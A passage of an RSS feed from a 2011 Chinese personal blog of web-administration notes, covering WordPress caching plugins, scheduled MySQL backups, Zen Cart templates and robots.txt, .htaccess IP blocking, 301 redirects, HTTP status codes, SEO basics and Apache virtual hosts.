      <pubDate>Mon, 31 Oct 2011 01:30:03 +0000</pubDate>
      
      <guid>https://ifunbox.top/112.html</guid>
      <description>简单简单安装wordpress相关页面优化插件，轻轻松松实现WordPress页面打开速度优化，插件采用：DB Cache Reloaded ,Hyper Cache,Wp Widget Cache , Gzip，script gzip 。
DB Cache Reloaded ：针对MySql使用一段时间会有相关的数据亢於(也就是数据缺乏关联)而进行自动的数据库优化。（DB Cache Reloaded Fix是在原有版本基础上爱好者开发的加强版）
Hyper Cache：针对动态网页需不断向服务器请求从而导致请求时间延误wordpress加载速度，该插件把网页实现Html静态化，减小上述的请求次数也就是优化时间。（Hyper Cache Extended也是原有版本的加强版）
Wp Widget Cache：Widget是wp的一个函数调用，同样会向服务器发出一些请求。可是一般的优化插件不会优化Widget，把Widdget Html的话，就可以减少了请求时间加快速度了！Wp Widget Cache 实现了侧边栏缓存，这个对性能提高也很明显哦~
Gzip：当我们实现了上述的网页非动态化时候，相对应的Html文件同样也可以进一步优化，Gzip就是实现了原来的Html压缩。
script gzip： Gzip只会压缩Html并不理会当下流行的CSS，针对Gzip只是压缩页面的Html内容并不默认压缩JS/CSS，且默认JS代码加载于网页的头部 影响搜索引擎打开速度的缺点。script gzip使得js以及css代码大幅度减小体积，且把代码的加载提到网页加载的末时间。有利于百度或者Google的加载。
上述的插件一定程度上实现了wordpress在服务器中的优化，还有其他优化技巧，欢迎大家一起探讨。</description>
    </item>
    
    <item>
      <title>定时备份远程mysql数据库到本地的方法</title>
      <link>https://ifunbox.top/107.html</link>
      <pubDate>Sun, 30 Oct 2011 14:37:02 +0000</pubDate>
      
      <guid>https://ifunbox.top/107.html</guid>
      <description>通常，如果网站是在虚拟服务器上的话，每天都要手动备份数据库那也很麻烦。这里推荐一个方法，利用windows的计划任务来实现。
&amp;nbsp;
前提 ：本地机器上装有mysql服务。
假设本地机器上mysql服务目录 d:/mysql
假设远程数据库地址：111.0.0.111
假设远程数据库名称：testdata
假设远程数据库用户名：admin
假设远程数据库密码：123456
&amp;nbsp;
1、新建一个记事本文件，路径为d:/backup/backup.txt，编辑该文件，内容如下
 title %1服务器mysql数据库备份 
IF NOT EXIST %5 md %5 
IF NOT EXIST %5\%1 md %5\%1
IF NOT EXIST %5\%1\%4 md %5\%1\%4 
@%6/mysqldump -h%1 -u%2 -p%3 &amp;#8211;opt %4  %5/%1/%4/%4_%date:~0,4%%date:~5,2%%date:~8,2%.sql
@echo %1服务器%4数据库备份成功    更改文件名称为backup.bat   存放备份数据的路径为d:/backup/数据库服务器地址/数据库名/备份时间.sql  &amp;nbsp;
2、运行 ：开始&amp;gt; 程序 &amp;gt; 附件 &amp;gt; 系统工具 &amp;gt; 任务计划，在弹出的窗口中选择 添加计划任务，浏览选择d:/backup/backup.bat文件，然后设置高级属性。
&amp;nbsp;
3、运行框内容 
 d:/backup/backup.bat 222.</description>
    </item>
    
    <item>
      <title>zencart robots.txt的阻止收录写法</title>
      <link>https://ifunbox.top/93.html</link>
      <pubDate>Fri, 28 Oct 2011 16:01:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/93.html</guid>
      <description>首先开启ZENCART URL 静态化，然后将下列代码复制到robots.txt中，放于根目录
这样就可以达到阻止一些不必要收录分权网页的效果
specials.html、products_all.html、products_new.html、featured_products.html根据自己喜好决定是否阻止收录。
User-agent: * Disallow: /cache/ Disallow: /contrib/ Disallow: /min/ Disallow: /docs/ Disallow: /extras/ Disallow: /htmlarea/ Disallow: /stats/ Disallow: /sitemap/ Disallow: /graphics/ Disallow: /login.html Disallow: /privacy.html Disallow: /conditions.html Disallow: /contact_us.html Disallow: /shippinginfo.html Disallow: /gv_faq.html Disallow: /discount_coupon.html Disallow: /unsubscribe.html Disallow: /shopping_cart.html Disallow: /ask_a_question.html Disallow: /popup_image_additional.html Disallow: /product_reviews_write.html Disallow: /tell_a_friend.html Disallow: /pages-popup_image.html? Disallow: /popup_image_additional.html? Disallow: /?main_page=* Disallow: /index.php?main_page=* </description>
    </item>
    
    <item>
      <title>ZEN CART 如何添加自定义页面</title>
      <link>https://ifunbox.top/87.html</link>
      <pubDate>Fri, 28 Oct 2011 06:45:38 +0000</pubDate>
      
      <guid>https://ifunbox.top/87.html</guid>
      <description>以about us页面为例, 默认模板
\includes\templates\template_default\templates\tpl_about_us_default.php
\includes\languages\english\about_us.php
\includes\languages\english\html_includes\define_about_us.php
\includes\modules\pages\about_us\header_php.php
\includes\filenames.php
&amp;nbsp;
  我们以About Us为例讲解一下zencart中如何新建页面！  1.在includes\languages\english\html_includes目录中新建文件define_about_us.php  这个文件是要显示的内容，我们可以在后台 工具-页面编辑 中进行编辑。  2.在includes\templates\Your_template\templates目录中新建文件tpl_about_us_default.php
并在此文件中增加如下代码： 
require($define_page);
?   3.在includes\modules\pages目录中新建about_us目录  4.在新建的about_us目录中新建文件header_php.php，并在文件中增加如下代码：
&amp;lt;?php  require(DIR_WS_MODULES . zen_get_module_directory(‘require_languages.php’));
$breadcrumb-&amp;gt;add(NAVBAR_TITLE);
$define_page = zen_get_file_directory(DIR_WS_LANGUAGES . $_SESSION[&amp;#8216;language&amp;#8217;] . ‘/html_includes/’, FILENAME_DEFINE_ABOUT_US, ‘false’);
?&amp;gt;  5.在includes/filenames.php文件增加如下代码：
define(‘FILENAME_DEFINE_ABOUT_US’, ‘define_about_us’);  6.在includes\languages\english目录中新建文件about_us.php，并在文件中增加如下代码：  &amp;lt;?php  define(‘NAVBAR_TITLE’, ‘About Us’);
define(‘HEADING_TITLE’, ‘About Us’);  define(‘TEXT_INFORMATION’, ‘About Us information goes here.’);
?&amp;gt;</description>
    </item>
    
    <item>
      <title>如何屏蔽禁止中国ip段</title>
      <link>https://ifunbox.top/84.html</link>
      <pubDate>Thu, 27 Oct 2011 14:41:22 +0000</pubDate>
      
      <guid>https://ifunbox.top/84.html</guid>
      <description>order allow,deny
# 禁止一个ip地址
deny from 123.125.125.147
# 屏蔽一个ip段
deny from 210.145.95.0/255
# 或者你需要在这ip段中允许部分ip
allow from 210.145.95.123
# 除此之外一切均可以访问
allow from all
这里有一份2008年中国IP段资料：
# This blocklist was last updated on Saturday, 17-May-2008 09:43:34 MDT
# 最新更新时间：2008-05-17
order deny,allow
# Chinese IP addresses follow:
# 中国ip地址
deny from 58.22.0.0/15 58.56.0.0/15 58.58.0.0/16 58.59.0.0/17 58.60.0.0/14 58.82.0.0/15 58.208.0.0/12 58.246.0.0/15 58.248.0.0/13 59.32.0.0/13 59.40.0.0/15 59.42.0.0/16 59.56.0.0/13 60.12.0.0/16 60.28.0.0/15 60.160.0.0/11 60.194.0.0/15 60.208.0.0/13 60.216.0.0/15 61.4.64.0/20 61.48.0.0/13 61.128.0.0/10 61.135.0.0/16 61.</description>
    </item>
    
    <item>
      <title>zencart安装时出现”PHP中没有编译CURL”</title>
      <link>https://ifunbox.top/81.html</link>
      <pubDate>Thu, 27 Oct 2011 14:37:15 +0000</pubDate>
      
      <guid>https://ifunbox.top/81.html</guid>
      <description>1.寻找PHP.ini并打开
2.按Ctrl-F键查找如下关键字：extension=php_curl.dll 把前面的那个&amp;#8221;;&amp;#8221;去掉。保存退出。重新启动Apache2服务
版本：php5.05
已经内置有php_curl.dll,在ext目录下,此DLL用于支持SSL和zlib.
在php.ini中找到有extension=php_curl.dll, 去掉前面的注释.
设置extension_dir=c:\php\ext, 刷新PHP页面时报错, 说找不到模块php_curl.dll.
拷贝php_curl.dll 到windows\system32,还是同样的错.
在网上找了一下,需要将:
libeay32.dll, ssleay32.dll, php5ts.dll, php_curl.dll
都拷贝到system32目录下,重启apache即可.
其中libeay32.dll, ssleay32.dll, php5ts.dll,在php目录下， php_curl.dll在php目录下的ext目录中。</description>
    </item>
    
    <item>
      <title>记录蜘蛛爬行日志代码(PHP)</title>
      <link>https://ifunbox.top/66.html</link>
      <pubDate>Tue, 25 Oct 2011 13:42:37 +0000</pubDate>
      
      <guid>https://ifunbox.top/66.html</guid>
      <description>记录蜘蛛爬行的日志格式如下：
爬行的时间，蜘蛛（搜索引擎机器人）类型，爬行目标页面，来自哪里
Time:2011-6-17 21:34:06 robot:Baiduspider pageURL:http://fanhefan.4430.0-168.com/index.php preUrl: URL:Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Time:2011-6-18 17:45:16 robot:Googlebot pageURL:http://fanhefan.4430.0-168.com/index.php?paged=4 preUrl: URL:Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
代码如下：
 将include放到网站入口处，一般在INDEX.PHP中，请在相同目录下新建一个名为googlebot.txt的文档。</description>
    </item>
    
    <item>
      <title>WordPress迁移、复制多站的方法</title>
      <link>https://ifunbox.top/63.html</link>
      <pubDate>Tue, 25 Oct 2011 13:23:07 +0000</pubDate>
      
      <guid>https://ifunbox.top/63.html</guid>
      <description>1.修改wordpress根目录下wp-config.php配置文件，更新以下内容
define(&amp;#8216;DB_NAME&amp;#8217;, &amp;#8221;);
define(&amp;#8216;DB_USER&amp;#8217;, &amp;#8221;);
define(&amp;#8216;DB_PASSWORD&amp;#8217;, &amp;#8221;);
define(&amp;#8216;DB_HOST&amp;#8217;, &amp;#8221;);

2.进入数据库导入原始数据库数据
然后wordpress的wp_options表下更新siteurl，home为当前域名即可</description>
    </item>
    
    <item>
      <title>常见Http Header返回状态详解</title>
      <link>https://ifunbox.top/54.html</link>
      <pubDate>Tue, 25 Oct 2011 13:12:16 +0000</pubDate>
      
      <guid>https://ifunbox.top/54.html</guid>
      <description>常见Http Header返回状态详解： &amp;nbsp;
当用户点击或搜索引擎向网站服务器发出浏览请求时，服务器将返回Http Header Http头信息状态码,常见几种如下:
  1、Http/1.1 200 OK 访问正常
表示成功访问,为网站可正常访问时的状态。&amp;nbsp;
   2、Http/1.1 301 Moved Permanently 301重定向永久重定向
对搜索引擎相对友好的跳转方式，当网站更换域名时可将原域名作301永久重定向到新域名，原域名权重可传递到新域名，也常有将不含www的域名301跳转到含www的，如xxx.com通过301跳转到www.xxx.com&amp;nbsp;
   3、Http/1.1 302 Found 为临时重定向
易被搜索引擎判为作弊,比如asp程序的response.Redirect()跳转、js跳转或静态http跳转。&amp;nbsp;
   4、Http/1.1 400 Bad Request 域名绑定错误
一般是服务器上域名未绑定成功，未备案等情况。&amp;nbsp;
   5、Http/1.1 403 Forbidden 没有权限访问此站
你的IP被列入黑名单，连接的用户过多，可以过后再试，网站域名解析到了空间，但空间未绑定此域名等情况。&amp;nbsp;
   6、Http/1.1 404 Not Found 文件或目录不存在
表示请求文件、目录不存在或删除，设置404错误页时需确保返回值为404。常有因为404错误页设置不当导致不存在的网页返回的不是404而导致搜索引擎降权。&amp;nbsp;
   7、Http/1.1 500 Internal Server Error 程序或服务器错误
表示服务器内部程序错误，出现这样的提示一般是程序页面中出现错误，如小的语法错误，数据连接故障等。   </description>
    </item>
    
    <item>
      <title>Http状态码一览表</title>
      <link>https://ifunbox.top/52.html</link>
      <pubDate>Tue, 25 Oct 2011 13:10:34 +0000</pubDate>
      
      <guid>https://ifunbox.top/52.html</guid>
      <description>Http状态码一览表    所谓的404页就是服务器404重定向状态返回页面。数字404指的是404号状态码。一般常用到的有200号状态码和404号状态码。200号表示网页被下载成功，而404号表示不能成功下载并产生错误。下面是HTTP状态码一览表。
1xx：请求收到，继续处理
2xx：操作成功收到，分析、接受
3xx：完成此请求必须进一步处理
4xx：请求包含一个错误语法或不能完成
5xx：服务器执行一个完全有效请求失败
100——客户必须继续发出请求
101——客户要求服务器根据请求转换HTTP协议版本
200——交易成功
201——提示知道新文件的URL
202——接受和处理、但处理未完成
203——返回信息不确定或不完整
204——请求收到，但返回信息为空
205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件
206——服务器已经完成了部分用户的GET请求
300——请求的资源可在多处得到
301——删除请求数据
302——在其他地址发现了请求数据
303——建议客户访问其他URL或访问方式
304——客户端已经执行了GET，但文件未变化
305——请求的资源必须从服务器指定的地址得到
306——前一版本HTTP中使用的代码，现行版本中不再使用
307——申明请求的资源临时性删除
400——错误请求，如语法错误
401——请求授权失败
402——保留有效ChargeTo头响应
403——请求不允许
404——没有发现文件、查询或URl
405——用户在Request-Line字段定义的方法不允许
406——根据用户发送的Accept拖，请求资源不可访问
407——类似401，用户必须首先在代理服务器上得到授权
408——客户端没有在用户指定的饿时间内完成请求
409——对当前资源状态，请求不能完成
410——服务器上不再有此资源且无进一步的参考地址
411——服务器拒绝用户定义的Content-Length属性请求
412——一个或多个请求头字段在当前请求中错误
413——请求的资源大于服务器允许的大小
414——请求的资源URL长于服务器允许的长度
415——请求资源不支持请求项目格式
416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求
也不包含If-Range请求头字段
417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下
一级服务器不能满足请求
500——服务器产生内部错误
501——服务器不支持请求的函数
502——服务器暂时不可用，有时是为了防止发生系统过载
503——服务器过载或暂停维修
504——关口过载，服务器使用另一个关口或服务来响应用户，等待时间设定值较长
505——服务器不支持或拒绝支请求头中指定的HTTP版本
－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
英文版：
100：Continue
101：Switching Protocols
102：Processing
200：OK
201：Created
202：Accepted
203：Non-Authoriative Information
204：No Content
205：Reset Content
206：Partial Content</description>
    </item>
    
    <item>
      <title>设置网站301跳转（全）</title>
      <link>https://ifunbox.top/48.html</link>
      <pubDate>Tue, 25 Oct 2011 13:07:00 +0000</pubDate>
      
      <guid>https://ifunbox.top/48.html</guid>
      <description>当有多个域名指向你的站点时，301跳转是每个网站常用的一种页面跳转方式，针对SEO来说，作用有以下几点：
1，301跳转是搜索引擎认可的一种跳转方式，也就是说通过这种方式从一个网址跳转到另外一个网址并不会受到搜索引擎的惩罚。
2，上面说过这种跳转方式是搜索引擎认可的，搜索引擎的设计者以及考虑到一个域名并不一定会跟随一个网站一辈子，利用这种跳转方式可以让搜索引擎认为您“永久”放弃这个域名并启用了新的域名，那么搜索引擎会把你的老域名相应权重转移到新的域名上来。不过这里要说明一下，并不是通过301跳转就能使权重完全转移的，这个还有很多因素决定。301只能说可以让损失减少到最低。
301的具体设置方式
1、IIS下301设置
Internet信息服务管理器 -&amp;gt; 虚拟目录 -&amp;gt; 重定向到URL，输入需要转向的目标
URL，并选择“资源的永久重定向”。
想了解更详细的方法：IIS下万能301跳转方法
2、ASP下的301转向代码 
&amp;lt;%@ Language=VBScript %&amp;gt; &amp;lt;% if request.ServerVariables(&#34;SERVER_NAME&#34;)=&#34;fanhefan.com&#34; then Response.Status=&#34;301 Moved Permanently&#34; Response.AddHeader &#34;Location&#34;, &#34;www.fanhefan.com&#34; Response.End end if %&amp;gt; 3、ASP.Net下的301转向代码
&amp;lt;script runat=&#39;server&#39;&amp;gt; private void Page_Load(object sender, System.EventArgs e) { Response.Status = &#39;301 Moved Permanently&#39;; Response.AddHeader(&#39;Location&#39;,&#39;www.fanhefan.com/301/&#39;); } &amp;lt;/script&amp;gt; 4、PHP下的301转向代码
if($HTTP_SERVER_VARS[&#34;HTTP_HOST&#34;]==&#34;fanhefan.com) { header(&#34;HTTP/1.1 301 Moved Permanently&#34;); header(&#34;Location: www.fanhefan.com&#34;); } 5、CGI Perl下的301转向代码
$q = new CGI; print $q-&amp;gt;redirect(&#34;www.fanhefan.com/301/&#34;); 6、JSP下的301转向代码
&amp;lt;% response.setStatus(301); response.</description>
    </item>
    
    <item>
      <title>SEO入门级知识问答</title>
      <link>https://ifunbox.top/12211212/</link>
      <pubDate>Tue, 25 Oct 2011 12:59:53 +0000</pubDate>
      
      <guid>https://ifunbox.top/12211212/</guid>
      <description>1、SEO是什么？
全称叫搜索引擎优化。人们使用搜索引擎查找自己需要的信息，那么作为网站的主人，我们希望用户通过搜索引擎能来到自己的网站。这就需要对网站进行SEO（搜索引擎优化）。
2、SEO了之后，有什么结果呢？
SEO的目的是一方面让你的网站某些词排名提高，另一方面让你网站的流量整体提高。
假设没有做SEO，那么你也不会来到SEO十万个为什么这个网站。
3、如何知道网站在搜索引擎上的排名情况呢？
你先需要知道，希望有排名的是什么词？比如：SEO十万个为什么这个网站，希望有排名的是 SEO，那么你可以直接在百度或Google上搜索SEO，然后去查找自己的网站。如果20页之内没有自己的网站，则一般就不用找了。说明目前还没很好的排名。
4、如何知道网站是否被搜索引擎收录了呢？
直接在搜索引擎输入：site:你的网站域名。比如：看SEO十万个为什么的收录情况，site:fanhefan.com
5、为什么site带www的域名和不带www的域名，收录量不一样呢？
site不带www的域名，包含了site带www域名的收录情况。比如：site:fanhefan.com那么就包含了site:www.fanhefan.com和site:bbs.fanhefan.com的收录量之和。
6、那为什么有时site带www的，比没带www的收录量多呢?
这往往是临时情况，过一段时间会稳定下来。
7、听说外链很重要，那我如何知道我网站的外链呢？
在百度和google上查外链都不是很准确，目前比较全面的是采用雅虎。比如：要查SEO十万个为什么的外链，则在www.yahoo.cn上输入：link:http://fanhefan.4430.0-168.com/注意：http://
8、听大家在说百度蜘蛛，那是什么呢？
百度蜘蛛和google机器人，具体说是一个程序。这个程序的功能是抓取网页的内容。
9、百度蜘蛛来抓取网站内容，我们能知道吗?
可以。通过网站的日志可以看到。
10、有意思，网站日志怎么看？
登陆你网站ＦＴＰ后台，看到一个包含ｌｏｇ的文件夹，里面就是日志，一般按日期存放。下载，解压，里面就是了。（如果没有，那是空间不支持日志）
11、网站日志下来了，也解压了，然后呢？
是一个记事本，打开后，搜索baiduspider，或googlebot，可以看到它们访问的地址。
12、我看到了。很多呀，一般有类似
[11/Jan/2009:04:03:07 +0800] “GET /bbs/thread-7125-1-1.html HTTP/1.1″ 200 7375 “-” “Baiduspider+(+http://www.baidu.com/search/spider.htm)”
是吗？
是的。200代表正常收录了。7375代表这次抓取的7375个字节的内容。如果不是这样的情况，那是具体服务器设置不同。
13、一般做SEO是怎么做？
SEO如果说要简单，是很简单。一般人说是在外链。因为在排名中外链很重要。但，当你反过来思考，整个SEO思维会引导你到底应该做什么，怎么做。
14、一般做SEO是需要多长时间有效果呢？
一般我们考虑的排名周期是1-3个月。也就是，这次修改，在1个月到3个月内会显示效果。
15、为什么有的做SEO有效果，有的没效果呢？
这里主要是一个思维认识问题。做SEO和打针吃药的思路还不一样，它更像是一套行为标准。你这样做了，可能获得很好的排名，但不是一定。因为有可能其人人也这样做，而且做得比你好。
16、那目前做SEO的人多吗？
比起美国SEO的火热和普及程度，国内目前SEO才刚刚开始。所以，你会看到很多学SEO的人，很快就排名上来了。
17、像我这样，从来没有建过网站的人，怎么学SEO？
学SEO的目的是排名和网站流量。所以，SEO本身的存在就带有功利性。学会建站是迟早的事情，但“建站”这个字眼对于新手可能是可怕的。其实，绝大部分的网站，都不是网站主人自己写的程序，而是采用开源的程序搭建。</description>
    </item>
    
    <item>
      <title>zencart修改模板结构常用代码</title>
      <link>https://ifunbox.top/34.html</link>
      <pubDate>Tue, 25 Oct 2011 12:45:17 +0000</pubDate>
      
      <guid>https://ifunbox.top/34.html</guid>
      <description>自己在1.3.9H版zencart下挖出来的代码都一些界面变动，直接复制黏贴相应的代码到指定位置就可以达到，改变界面的效果啦~
zencart修改模板结构常用代码
改币种
Currencies: get_template_dir(&#39;tpl_header_currencies.php&#39;,DIR_WS_TEMPLATE, $current_page_base,&#39;templates&#39;). &#39;/tpl_header_currencies.php&#39;); echo $content; ?  改语言
&amp;lt;
get_template_dir(&amp;#8216;tpl_header_languages.php&amp;#8217;,DIR_WS_TEMPLATE, $current_page_base,&amp;#8217;templates&amp;#8217;). &amp;#8216;/tpl_header_languages.php&amp;#8217;); echo $content; ?   购物车
   //tpl_shopping_cart_header.php里面改价格，几种商品的显示格式 get_template_dir(&#39;tpl_shopping_cart_header.php&#39;,DIR_WS_TEMPLATE, $current_page_base,&#39;templates&#39;).&#39;/tpl_shopping_cart_header.php&#39;); echo $content; ?  count_contents() != 0) { ?  &amp;nbsp;|   &#34;    ```  搜索条 ```  get_template_dir(&#39;tpl_search_header.php&#39;,DIR_WS_TEMPLATE, $current_page_base,&#39;templates&#39;). &#39;/tpl_search_header.php&#39;);?       &amp;lt;p&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;登录&amp;lt;/span&amp;gt; &amp;lt;/p&amp;gt; ```   &amp;lt;?php if ($_SESSION[&amp;lsquo;customer_id&amp;rsquo;]) { ?</description>
    </item>
    
    <item>
      <title>怎么使用Appserv配置多站点访问</title>
      <link>https://ifunbox.top/22.html</link>
      <pubDate>Tue, 25 Oct 2011 12:15:39 +0000</pubDate>
      
      <guid>https://ifunbox.top/22.html</guid>
      <description>在之前的Appserv教程中，我介绍了AppServ配置与安装使用教程，Appserv作为PHP集成环境安装包，可以实现多种功能，配置Appserv实现多站点功能可方便PHP开发团队实时调试多个PHP网站，有访友向我提出怎么使用Appserv配置多站点问题，通过实践验证后，我以Appserv教程形式来作下解答。 
Appserv配置多站点教程第一步：下载Appserv并安装 
我下载的是Appserv-Win32-2.5.10版本，下载后直接双击并根据提示安装即可。 
Appserv配置多站点教程第二步：修改Windows系统hosts文件 
我的Appserv安装环境是WindowsXP，为什么首先要修改hosts文件呢？这是因为一般情况下Appserv的安装调试都是在本机上进行的，当使用Appserv配置多站点时，域名指向都是127.0.0.1，你需要对不同的域名进行映射，否则即便配置完毕也是无法访问的，除非你有公网IP，并通过DNS进行映射。 
找到WINDOWS\system32\drivers\etc\hosts文件并打开，找到127.0.0.1 localhost，并添加需要映射的测试站点域名，比如
127.0.0.1 www.fanhefan.com
保存hosts文件 
&amp;nbsp;
Appserv配置多站点教程第三步：修改Apache配置文件，启用虚拟主机配置 
在Appserv安装目录中找到Apache2.2\conf目录，打开apache配置文件httpd.conf，找到# Virtual hosts将 #Include conf/extra/httpd-vhosts.conf 中的#去除。 
由于Appserv配置中Apache配置是以定制方式存在，上述语句代表Apache启用虚拟主机配置。同时Appserv多站点配置功能是以虚拟主机的方式实现，你可以一并将httpd配置文件中的 #LoadModule vhost_alias_module modules/mod_vhost_alias.so #去除（经过我的测试，其实此Apache Module加不加载没太大关系） 
Appserv配置多站点教程第四步：修改Apache虚拟主机配置 
打开conf/extra/httpd-vhosts.conf配置文件，文件中本身存在两条虚拟主机配置记录，只要稍作修改即可。 
将ServerAdmin（邮件地址）、DocumentRoot（网站根目录，我设定的目录为”C:/AppServ/www/fanhefan/”、ServerName(站点域名信息)、ServerAlias（站点域名别名）配置选项设置为你需要设定的信息即可。
Appserv配置多站点实例如下
&amp;lt;VirtualHost fanhefan.com ServerAdmin 101123408@qq.com DocumentRoot &#34;C:/AppServ/www/fanhefan/&#34; ServerName fanhefan.com ErrorLog logs/bssn-error_log CustomLog logs/bssn_log common &amp;lt;/VirtualHost &amp;lt;Directory &#34;C:/AppServ/www/fanhefan/&#34; AllowOverride All Options All Order allow,deny Allow from all &amp;lt;/Directory  Appserv多站点配置提示：如果同时配置多个虚拟主机，务必确保第一条虚拟主机记录不可缺失ServerAlias选项，否则配置不会成功。 
最后保存conf/extra/httpd-vhosts.conf配置文件。</description>
    </item>
    
    <item>
      <title>如何在zencart产品页下方增加随机产品列表</title>
      <link>https://ifunbox.top/17.html</link>
      <pubDate>Tue, 25 Oct 2011 09:56:29 +0000</pubDate>
      
      <guid>https://ifunbox.top/17.html</guid>
      <description>1.首先找到文件includes/templates/模板名/templates/tpl_product_info_display.php
找到代码&amp;lt;!&amp;#8211;eof also purchased products module&amp;#8211;&amp;gt;在下方加入
&amp;lt;span style=&amp;ldquo;font-size: medium;&amp;ldquo;&amp;gt;&amp;lt;?php &amp;lt;/span&amp;gt; &amp;lt;span style=&amp;ldquo;font-size: medium;&amp;ldquo;&amp;gt;require($template-&amp;gt;get_template_dir(&amp;lsquo;tpl_modules_whats_new.php&amp;rsquo;,DIR_WS_TEMPLATE, $current_page_base,&amp;lsquo;templates&amp;rsquo;). &amp;lsquo;/tpl_modules_whats_new.php&amp;rsquo;);&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;ldquo;font-size: medium;&amp;ldquo;&amp;gt;?&amp;gt;&amp;lt;/span&amp;gt;
 &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;这里我们调用的是新产品的函数，所以&amp;lt;strong&amp;gt;zencart中产品页下方显示的是随机产品&amp;lt;/strong&amp;gt;。&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;2.然后找到includes/templates/模板名/common/tpl_columnar_display.php用下面的代码覆盖这个文件下的代码&amp;lt;/span&amp;gt; &amp;lt;pre&amp;gt;&amp;lt;code class=&amp;quot;php&amp;quot;&amp;gt; &amp;lt;!--?php /** * Common Template - tpl_columnar_display.php * * This file is used for generating tabular output where needed, based on the supplied array of table-cell contents. * * @package templateSystem * @copyright Copyright 2003-2006 Zen Cart Development Team * @copyright Portions Copyright 2003 osCommerce * @license http://www.</description>
    </item>
    
    <item>
      <title>关于funbox</title>
      <link>https://ifunbox.top/about/</link>
      <pubDate>Mon, 24 Oct 2011 06:14:26 +0000</pubDate>
      
      <guid>https://ifunbox.top/about/</guid>
      <description>这个博客全然当做记事本来用了，本人健忘记录一些自己需要的知识点~~ </description>
    </item>
    
  </channel>
</rss>